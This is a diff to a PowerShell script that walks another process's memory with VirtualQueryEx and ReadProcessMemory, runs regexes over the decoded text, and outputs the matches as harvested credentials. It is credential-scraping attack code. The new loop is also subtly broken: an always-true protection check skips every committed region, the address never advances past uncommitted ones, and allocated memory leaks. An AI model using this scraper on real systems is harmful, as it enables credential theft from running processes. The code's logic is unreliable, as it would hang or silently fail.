@@ -76,7 +76,7 @@
         [void]$StructBuilder.DefineField('BaseAddress', [IntPtr], 'Public')
         [void]$StructBuilder.DefineField('AllocationBase', [IntPtr], 'Public')
         [void]$StructBuilder.DefineField('AllocationProtect', [UInt32], 'Public')
-        [void]$StructBuilder.DefineField('Alignment', [UInt16], 'Public')
+        [void]$StructBuilder.DefineField('Alignment1', [UInt16], 'Public')
         [void]$StructBuilder.DefineField('RegionSize', [IntPtr], 'Public')
         [void]$StructBuilder.DefineField('State', $PageState, 'Public')
         [void]$StructBuilder.DefineField('Protect', $AllocationProtect, 'Public')
@@ -210,7 +210,6 @@
 
     #endregion Regexes 
 
-
     $SystemInfo = [Activator]::CreateInstance($SYSTEM_INFO)
     $Kernel32::GetSystemInfo([ref]$SystemInfo)
     $Wow64 = $false
@@ -227,14 +226,56 @@
         
     if ($Wow64 -or $SystemInfo.ProcessorArchitecture -eq 0) { $MemInfo = [Activator]::CreateInstance($MEMORY_BASIC_INFORMATION32) }
     else { $MemInfo = [Activator]::CreateInstance($MEMORY_BASIC_INFORMATION) }
+        
+    $MemInfoSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$MemInfo.GetType())
     
     $RegionBaseAddress = $SystemInfo.MinimumApplicationAddress
 
-    $MemInfoSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$MemInfo.GetType())
+    while ($RegionBaseAddress.ToInt64() -lt $SystemInfo.MaximumApplicationAddress.ToInt64()) {
 
-    $lpMemInfo = [Runtime.InteropServices.Marshal]::AllocHGlobal($MemInfoSize)
-    [Runtime.InteropServices.Marshal]::StructureToPtr($MemInfo, $lpMemInfo, $true)
+        $lpMemInfo = [Runtime.InteropServices.Marshal]::AllocHGlobal($MemInfoSize)
+        [Runtime.InteropServices.Marshal]::StructureToPtr($MemInfo, $lpMemInfo, $true)
 
-    $return = $Kernel32::VirtualQueryEx($ProcessHandle, $RegionBaseAddress, $lpMemInfo, $MemInfoSize)
-    $MemInfo = [Runtime.InteropServices.Marshal]::PtrToStructure($lpMemInfo, [Type]$MemInfo.GetType())
+        if (!$Kernel32::VirtualQueryEx($ProcessHandle, $RegionBaseAddress, $lpMemInfo, $MemInfoSize)) { $ErrorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            throw (New-Object ComponentModel.Win32Exception $ErrorCode)
+        }
+
+        $MemInfo = [Runtime.InteropServices.Marshal]::PtrToStructure($lpMemInfo, [Type]$MemInfo.GetType())
+        $RegionSize = $MemInfo.RegionSize.ToInt64()
+
+        if ($MemInfo.State -eq [PageState]::MEM_COMMIT) {
+            
+            if ($MemInfo.Protect -eq [AllocationProtect]::PAGE_NOACCESS -or [AllocationProtect]::PAGE_GUARD) { 
+                [IntPtr]$RegionBaseAddress = $RegionBaseAddress.ToInt64() + $RegionSize
+                [Runtime.InteropServices.Marshal]::FreeHGlobal($lpMemInfo)
+                continue 
+            }
+        
+            if (($MemInfo.Protect -band ([AllocationProtect]::PAGE_READONLY -bor [AllocationProtect]::PAGE_READWRITE -bor [AllocationProtect]::PAGE_EXECUTE_READ -bor 
+                [AllocationProtect]::PAGE_EXECUTE_READWRITE -bor [AllocationProtect]::PAGE_EXECUTE_WRITECOPY)) -ne 0) {
+
+                $Buffer = New-Object byte[] $RegionSize
+                $BytesRead = 0
+
+                if (!$Kernel32::ReadProcessMemory($ProcessHandle, $MemInfo.BaseAddress, $Buffer, $RegionSize, [ref]$BytesRead)) { $ErrorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                    $Exception = New-Object ComponentModel.Win32Exception $ErrorCode
+                    Write-Warning $Exception.Message
+                }
+
+                if ($BytesRead) {
+                    $UnicodeString = [Text.Encoding]::Unicode.GetString($Buffer, 0, $BytesRead)
+                    
+                    foreach ($Key in $Regexes.Keys) { 
+                        foreach ($Match in $Regexes[$Key].Matches($UnicodeString)) { Write-Output ([pscustomobject]@{Name = $Key; Credentials = $Match}) }
+                    }
+
+                    $AsciiString = [Text.Encoding]::ASCII.GetString($Buffer, 0, $BytesRead)
+                    foreach ($Key in $Regexes.Keys) { 
+                        foreach ($Match in $Regexes[$Key].Matches($AsciiString)) { Write-Output ([pscustomobject]@{Name = $Key; Credentials = $Match}) }
+                    }
+                }
+                else { continue }
+            }
+        }
+    }
 }
